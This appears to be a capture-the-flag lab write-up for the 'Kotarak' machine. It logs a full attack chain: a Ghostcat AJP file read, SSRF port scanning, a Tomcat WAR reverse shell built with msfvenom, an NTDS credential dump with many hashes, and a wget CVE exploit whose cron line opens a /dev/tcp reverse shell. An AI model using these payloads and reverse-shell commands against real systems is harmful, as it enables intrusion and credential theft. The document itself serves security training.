## Kotarak

### Lab Details 

- Difficulty: Hard
- Type: SSRF, LFI, Wget, Hash Cracking, Priv Esc, Linux

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5 - Error report
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting      
```
port 8009 - `Apache Jserv`
`What is Apache Jserv?`
`AJP (Apache JServ Protocol):` is a special, optimized protocol designed specifically for **communication between a web server (like Apache) and a Java application server (like Tomcat)**. It's more efficient than HTTP for this back-end communication because it's a binary protocol (not text-based), keeps connections alive, and can share important request information efficiently.
- CVE-2020-10487 `https://github.com/00theway/Ghostcat-CNVD-2020-10487`
```bash
$ python3 ajpShooter.py  http://10.129.1.117 8009 /WEB-INF/web.xml read

       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1227-1472673232000"
[<] Last-Modified: Wed, 31 Aug 2016 19:53:52 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1227

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```
port 8080 - `Error report`
- getting `HTTP Status 404 - /` upon visit
```bash
$ ffuf -u http://10.129.1.117:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -fw 2,24 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.117:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2,24
________________________________________________

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
```

port 60000 - `Kotarak Web Hosting`
![[kotarak web hosting private browser.png]]
- `lfi` - click on the tabs on the left does not redirect, while clicking on `Submit` changes the url to `http://10.129.1.117:60000/url.php?path=` which could be vulnerable to `lfi`
- fuzzing for files 
```bash
$ ffuf -u http://10.129.1.117:60000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -fw 22 -e .php,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.117:60000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 22
________________________________________________

index.php               [Status: 200, Size: 1169, Words: 226, Lines: 77, Duration: 11ms]
.                       [Status: 200, Size: 1169, Words: 226, Lines: 77, Duration: 3ms]
url.php                 [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 30ms]
info.php                [Status: 200, Size: 92318, Words: 4583, Lines: 1110, Duration: 850ms]
```
- run `dunc-bypasser.py` , found vulnerable functions
```bash
$ python2 dfunc-bypasser.py --url http://10.129.1.117:60000/info.php


                                ,---,     
                                  .'  .' `\   
                                  ,---.'     \  
                                  |   |  .`\  | 
                                  :   : |  '  | 
                                  |   ' '  ;  : 
                                  '   | ;  .  | 
                                  |   | :  |  ' 
                                  '   : | /  ;  
                                  |   | '` ,/   
                                  ;   :  .'     
                                  |   ,.'       
                                  '---'         


			authors: __c3rb3ru5__, $_SpyD3r_$


Please add the following functions in your disable_functions option: 
pcntl_wifcontinued,pcntl_signal_get_handler,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,ld,mail,mb_send_mail
If PHP-FPM is there stream_socket_sendto,stream_socket_client,fsockopen can also be used to be exploit by poisoning the request to the unix socket
```
- checking page source and found that the on click function redirects to `url.php` from the name of file we can deduce that the input should be a link
![[testing for ssrf.png]]
- try putting in our `ip` and we get a connection back from target
```bash
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.1.117] 52844
GET / HTTP/1.1
Host: 10.10.14.82:8000
Accept: */*
```
- `ssrf` - using `ssrf` to enumerate internal ports
```bash
$ ffuf -u http://10.129.1.117:60000/url.php?path="127.0.0.1:FUZZ" -w <( seq 1 65535) -mc all -fs 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.117:60000/url.php?path=127.0.0.1:FUZZ
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 2
________________________________________________

22                      [Status: 200, Size: 62, Words: 3, Lines: 5, Duration: 38ms]
90                      [Status: 200, Size: 156, Words: 10, Lines: 12, Duration: 24ms]
110                     [Status: 200, Size: 187, Words: 16, Lines: 18, Duration: 22ms]
200                     [Status: 200, Size: 22, Words: 2, Lines: 4, Duration: 28ms]
320                     [Status: 200, Size: 1232, Words: 93, Lines: 27, Duration: 29ms]
888                     [Status: 200, Size: 3955, Words: 449, Lines: 79, Duration: 22ms]
3306                    [Status: 200, Size: 123, Words: 5, Lines: 3, Duration: 25ms]
8080                    [Status: 200, Size: 994, Words: 47, Lines: 3, Duration: 6ms]
60000                   [Status: 200, Size: 1171, Words: 226, Lines: 79, Duration: 11ms]
```
- visiting the port individually 
```bash
http://10.129.1.117:60000/url.php?path=127.0.0.1%3A90
http://10.129.1.117:60000/url.php?path=127.0.0.1%3A110
http://10.129.1.117:60000/url.php?path=127.0.0.1%3A200
http://10.129.1.117:60000/url.php?path=127.0.0.1%3A320
http://10.129.1.117:60000/url.php?path=127.0.0.1%3A888
```
- on port 320 is serving `Super Sensitive Login Page`
![[login page on port 320.png]]
- on port 888 is serving `Simple File Viewer`
![[simple file viewer.png]]
- we can see the location is at `?doc=backup`, attempt to fetch file and we get admin password
```bash
$ curl http://10.129.1.117:60000/url.php?path=127.0.0.1%3A888?doc=backup
<?xml version="1.0" encoding="UTF-8"?>
<SNIP>
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
    <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>

</tomcat-users>
```
#### Initial Foothold 
- user the credential found in the backup file to login to `/manager/html`
![[apache manager.png]]
- we have the access to deploy `java war` file
![[war upload.png]]
- use `msfvenom` to create a reverse shell payload
```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.82 LPORT=4444 -f war -o revshell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
Saved as: revshell.war
```
- we get a connection back on our listener
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.1.117] 48156

whoami
tomcat
```

#### Lateral Movement (If any)
- check users under `/home`
```bash
$ ls /home
atanas	tomcat
```
- cant run `sudo -l`
- found two files that are appears to be  `NTDS.dit grab` files from a Domain Controller
```bash
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ pwd
/home/tomcat/to_archive/pentest_data
tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

```bash
$ secretsdump.py -system 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
Administrator:des-cbc-md5:75375eda54757c2f
WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
krbtgt:des-cbc-md5:10ef08047a862046
krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
WINXP1$:des-cbc-md5:984a40d5f4a815f2
WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
WIN7$:des-cbc-md5:89a1673723ad9180
WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
atanas:des-cbc-md5:6b80e391f113542a
[*] Cleaning up... 
```
- save the NT hash and crack it with `hashcat`, however unable to obtain the plain test
- use [`crackstation`](https://crackstation.net/)
![[crackstation.png]]
- found plain text of user `atanas` to be `Password123!`
- however did not work try decrypting admin hash get `f16tomcat!`
- worked with admin password
![[crackstation hashes.png]]
#### Privilege Escalation

```bash
debugfs -R "ls -l /root" /dev/mapper/Kotarak--vg-root
```
![[root dir.png]]
```

atanas@kotarak-dmz:~$ debugfs -R "cat /root/flag.txt" /dev/mapper/Kotarak--vg-root
debugfs 1.42.13 (17-May-2015)
Getting closer! But what you are looking for can't be found here.

```

```bash
atanas@kotarak-dmz:/$ ls -la /root          ls -la /root
ls -la /root
total 48
drwxrwxrwx  6 root   root 4096 Sep 19  2017 .
drwxr-xr-x 27 root   root 4096 Aug 29  2017 ..
-rw-------  1 atanas root  333 Jul 20  2017 app.log
<SNIP>
```

```bash
atanas@kotarak-dmz:/root$ cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```

- search for `wget 1.16` `vunlerabilities` and found [CVE](https://www.exploit-db.com/exploits/40064)
- the `CVE` explains that for `wget version < 1.18`, if `wget` is running as a `cron job` and attack has compromised the target machine or is able to coerce `root` to send a `wget` request to a `http` server 
- what we can then is from that `http` server forward the request to a malicious ftp server that's serves a malicious `.wgetrc` file to perform an file inclusion
- the `POC` it self includes `RCE` which we can use to get `RCE`cat 
- put `root.txt` file in `.wgetrc` since that the file we want to read
```bash
atanas@kotarak-dmz:/tmp$ cat .wgetrc 
post_file = root.txt
output_document = /etc/cron.d/wget-root-shell
```
- then copy the `POC` from the `CVE` and modify the `IP address`
```bash
atanas@kotarak-dmz:/tmp$ cat wget-exploit.py
<SNIP>
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.129.1.117'
FTP_PORT = 21

## reverse shell on target, as the source of wget is from a container
ROOT_CRON = "* * * * * root /bin/sh -i >& /dev/tcp/10.129.1.117/9002 0>&1 \n"
<SNIP>
```
- ensure that the `exploit` and `.wgetrc` are in the same directory 
- we need at least 2 shell instances, one for `ftp` and one for `http` server on target
- running the script and staring up `http` server
```bash
atanas@kotarak-dmz:/tmp$ authbind python wget-exploit.py
Ready? Is your FTP server running?
FTP found open on 10.129.1.117:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /archive.tar.gz by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root 

10.0.3.133 - - [25/Oct/2025 09:32:01] "GET /archive.tar.gz HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.129.1.117:21/.wgetrc 

We have a volunteer requesting /archive.tar.gz by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 950d1425795dfd38272c93ccbb63ae2c
 
---[eof]---


Sending back a cronjob script as a thank-you for the file...
```
- running the `ftp` server
```bash
atanas@kotarak-dmz:/tmp$ authbind  python -m pyftpdlib -p21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2025-10-25 09:21:21] >>> starting FTP server on 0.0.0.0:21, pid=59765 <<<
[I 2025-10-25 09:21:21] concurrency model: async
[I 2025-10-25 09:21:21] masquerade (NAT) address: None
[I 2025-10-25 09:21:21] passive ports: None
[I 2025-10-25 09:21:32] 10.129.1.117:33952-[] FTP session opened (connect)
[I 2025-10-25 09:22:01] 10.0.3.133:41974-[] FTP session opened (connect)
[I 2025-10-25 09:22:01] 10.0.3.133:41974-[anonymous] USER 'anonymous' logged in.
[I 2025-10-25 09:22:01] 10.0.3.133:41974-[anonymous] RETR /tmp/.wgetrc completed=1 bytes=70 seconds=0.002
[I 2025-10-25 09:22:01] 10.0.3.133:41974-[anonymous] FTP session closed (disconnect).
[I 2025-10-25 09:24:01] 10.0.3.133:41982-[] FTP session opened (connect)
[I 2025-10-25 09:24:01] 10.0.3.133:41982-[anonymous] USER 'anonymous' logged in.
[I 2025-10-25 09:24:01] 10.0.3.133:41982-[anonymous] RETR /tmp/.wgetrc completed=1 bytes=70 seconds=0.002
[I 2025-10-25 09:24:01] 10.0.3.133:41982-[anonymous] FTP session closed (disconnect).
```
- we will need to wait for 2 cycles first time is to load the `.wgetrc` and the second time is to execute `RCE` and getting file from remote

#### Resources

#### Lesson Learned
